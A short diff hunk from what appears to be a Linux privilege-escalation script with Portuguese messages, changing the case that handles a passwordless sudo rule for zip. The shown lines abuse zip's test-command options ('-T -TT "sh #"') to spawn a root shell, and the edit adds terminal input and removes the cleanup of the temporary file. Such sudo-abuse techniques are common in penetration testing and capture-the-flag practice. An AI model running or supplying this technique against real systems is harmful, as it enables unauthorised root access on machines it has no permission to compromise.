@@ -2855,8 +2855,7 @@ EOF
         zip)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             TF=$(mktemp -u)
-            sudo "$paths" $TF /etc/hosts -T -TT 'sh #'
-            sudo rm $TF
+            sudo "$paths" $TF /etc/hosts -T -TT 'sh #' </dev/tty
             ;;
         zsh)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
